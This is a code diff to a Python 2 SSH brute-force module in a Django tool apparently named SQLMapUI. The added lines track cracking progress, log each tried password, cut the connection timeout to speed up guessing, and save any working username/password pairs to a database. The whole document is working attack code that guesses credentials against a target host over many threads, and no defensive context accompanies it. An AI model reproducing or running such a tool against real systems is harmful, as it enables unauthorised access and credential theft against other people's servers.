@@ -15,25 +15,31 @@
 from AttackBase import AttackBase
 from AttackObject import AttackObject
 import threading,traceback,Queue,paramiko
+from SQLMapUI.models import PortCrack
+from SQLMapUI.util import currenttime
+import datetime,json,time,sys
 
 class SSHAttack(AttackBase):
 
     def __init__(self,attackOjbect):
         super(SSHAttack, self).__init__(attackOjbect)
-    """
-    SSH爆破类
-    """
+
     def attack(self):
+        """
+        SSH爆破类
+        """
         result = {"status":True,"msg":"正在破解"}
         try:
-            self.attackOjbect.usernames = "/Users/margin/PycharmProjects/SQLMap/SQLMapUI/attack/username.txt"
-            self.attackOjbect.passwords = "/Users/margin/PycharmProjects/SQLMap/SQLMapUI/attack/password.txt"
+            # 获取线程数
             threads = self.attackOjbect.getThreads()
+            # 生成字典对应的queue
             attack_queue_result = self.attack_queue()
+            self.attackOjbect.attack_queue_size = attack_queue_result["data"].qsize()
             if attack_queue_result["status"]:
                 self.attackOjbect.attack_queue = attack_queue_result["data"]
             else:
                 return attack_queue_result
+            print "共并发【%s】个线程" % threads
             for index in range(0,threads):
                 attacker = Attacker(self.attackOjbect)
                 attacker.start()
@@ -53,6 +59,9 @@ class Attacker(threading.Thread):
         self.attackObject = attackObject
 
     def run(self):
+
+        reload(sys)
+        sys.setdefaultencoding('utf8')
         ip_ = self.attackObject.getIp()
         port_ = self.attackObject.getPort()
         attack_queue = self.attackObject.getAttack_queue()
@@ -60,18 +69,50 @@ class Attacker(threading.Thread):
             up_ = self.attackObject.getAttack_queue().get()
             username_ = up_[0]
             password_ = up_[1]
-            print self.getName() + ":" + username_ + ":" + password_
+            # 计算进度
+            c_size = self.attackObject.getAttack_queue_current_size()
+            o_size = self.attackObject.getAttack_queue_size()
+            progress = 1-float(format(float(c_size)/float(o_size),'.4f'))
+            progress = '%.2f%%' % (progress * 100)
+            param = ("SSH",progress,username_,password_)
+            # 读取log日志
+            log = self.attackObject.getLog(param)
+            # 更新日志数据
+            PortCrack.objects.filter(id=self.attackObject.getId()).update(end_time=currenttime(),type="SSH",progress=str(progress),log=str(log))
+            # 如果连接成功，说明用户名密码正确
             if self.connect(ip_,username_,password_):
-                print "破解成功%s:%s" % (username_,password_)
                 # 清空队列
                 self.attackObject.attack_queue.queue.clear()
+                # 让该线程暂停1秒，保证该数据最后更新。
+                time.sleep(1)
+                # 先查询数据，然后将里面的数据进行更新
+                attack_result = []
+                obj = PortCrack.objects.get(id=self.attackObject.getId())
+                will_update = {"ip":str(ip_),"port":port_,"username":username_,"password":password_}
+                # 判断数据库中是否已经有了破解信息
+                if obj.result is None or obj.result == "":
+                    attack_result = [will_update]
+                else:
+                    attack_result = json.loads(obj.result)
+                    attack_result.append(will_update)
+                PortCrack.objects.filter(id=self.attackObject.getId()).update(end_time=currenttime(),status="success",result=str(attack_result),log=self.attackObject.getSuccessLog(("SSH",username_,password_)))
 
     def connect(self,host,username,password):
+        """
+        ssh连接
+        :param host:
+        :param username:
+        :param password:
+        :return:
+        """
+        ssh=paramiko.SSHClient()
         try:
-            ssh=paramiko.SSHClient()
+            #print username+':'+password+'开始时间======》' + str(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'))
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(hostname=host,username=username,password=password,timeout=5)
-            ssh.close()
+            ssh.connect(hostname=host,username=username,password=password,timeout=0.2)
             return True
         except:
+            #print username+':'+password+'结束时间======》' + str(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'))
             return False
+        finally:
+            ssh.close()
